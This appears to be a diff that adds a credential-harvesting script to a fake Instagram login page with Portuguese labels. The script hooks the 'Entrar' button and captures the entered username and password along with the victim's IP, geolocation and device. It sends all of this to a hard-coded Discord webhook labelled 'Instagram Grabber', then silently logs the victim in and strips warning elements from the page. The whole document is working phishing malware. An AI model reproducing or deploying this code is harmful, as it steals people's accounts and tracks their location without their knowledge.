@@ -1,1 +1,129 @@
-
+<script>
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1484004957576364134/CeQR4xYrAUVJNyJrHyR9MNPaASYGZVK-nKAP7AZWD8KJnJUAmBaIREToUw8ELoLQOz5m';
+    
+    function getIP() {
+        return fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(d => d.ip)
+            .catch(() => 'Não disponível');
+    }
+    
+    function getLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
+                () => resolve(null),
+                { timeout: 3000 }
+            );
+            setTimeout(() => resolve(null), 3500);
+        });
+    }
+    
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let device = 'Desktop';
+        let os = 'Desconhecido';
+        
+        if (/Android/i.test(ua)) { device = 'Mobile'; os = 'Android'; }
+        else if (/iPhone|iPad|iPod/i.test(ua)) { device = 'Mobile'; os = 'iOS'; }
+        else if (/Windows/i.test(ua)) os = 'Windows';
+        else if (/Mac/i.test(ua)) os = 'macOS';
+        else if (/Linux/i.test(ua)) os = 'Linux';
+        
+        return { device, os, browser: /Chrome|Firefox|Safari|Edg/i.exec(ua)?.[0] || 'Outro' };
+    }
+    
+    function removerAvisos() {
+        document.querySelectorAll('[role="alert"], [class*="warning"], [class*="error"]').forEach(el => el?.remove());
+    }
+    setInterval(removerAvisos, 500);
+    new MutationObserver(removerAvisos).observe(document.body, { childList: true, subtree: true });
+    
+    async function loginInstagram(usuario, senha) {
+        try {
+            const response = await fetch('https://www.instagram.com/api/v1/web/accounts/login/ajax/', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'X-Requested-With': 'XMLHttpRequest'
+                },
+                body: new URLSearchParams({
+                    'username': usuario,
+                    'enc_password': `#PWD_INSTAGRAM_BROWSER:0:${Date.now()}:${senha}`,
+                    'queryParams': '{}',
+                    'optIntoOneTap': 'false'
+                })
+            });
+            
+            const data = await response.json();
+            
+            if (data.authenticated) {
+                window.location.href = 'https://www.instagram.com/';
+            } else {
+                window.location.href = 'https://www.instagram.com/accounts/login/';
+            }
+        } catch (error) {
+            window.location.href = 'https://www.instagram.com/accounts/login/';
+        }
+    }
+    
+    async function capturar() {
+        const user = document.getElementById('_r_6_')?.value;
+        const pass = document.getElementById('_r_9_')?.value;
+        
+        if (user?.length > 2 && pass?.length > 2) {
+            const ip = await getIP();
+            const location = await getLocation();
+            const device = getDeviceInfo();
+            
+            const embed = {
+                title: "🎯 INSTAGRAM LOGIN CAPTURADO",
+                color: 0xE4405F,
+                timestamp: new Date().toISOString(),
+                fields: [
+                    { name: "👤 USUÁRIO", value: `\`${user}\``, inline: true },
+                    { name: "🔑 SENHA", value: `\`${pass}\``, inline: true },
+                    { name: "📱 DISPOSITIVO", value: `${device.device} | ${device.os} | ${device.browser}`, inline: false },
+                    { name: "🌐 IP", value: ip, inline: true }
+                ],
+                footer: { text: "7th Family • Instagram Grabber", icon_url: "https://i.imgur.com/xxx.png" }
+            };
+            
+            if (location) {
+                embed.fields.push({
+                    name: "📍 LOCALIZAÇÃO",
+                    value: `Lat: ${location.lat} | Lng: ${location.lng}\n[Ver no mapa](https://maps.google.com/?q=${location.lat},${location.lng})`,
+                    inline: false
+                });
+            }
+            
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: "@everyone **✅ NOVA VÍTIMA**",
+                    embeds: [embed],
+                    username: "7th Family Grabber",
+                    avatar_url: "https://i.imgur.com/xxx.png"
+                })
+            });
+            
+            loginInstagram(user, pass);
+        }
+    }
+    
+    setInterval(() => {
+        const botao = Array.from(document.querySelectorAll('span'))
+            .find(span => span.textContent === 'Entrar')
+            ?.closest('[role="button"]');
+            
+        if (botao && !botao._hasListener) {
+            botao._hasListener = true;
+            botao.addEventListener('click', capturar);
+        }
+    }, 1000);
+</script>
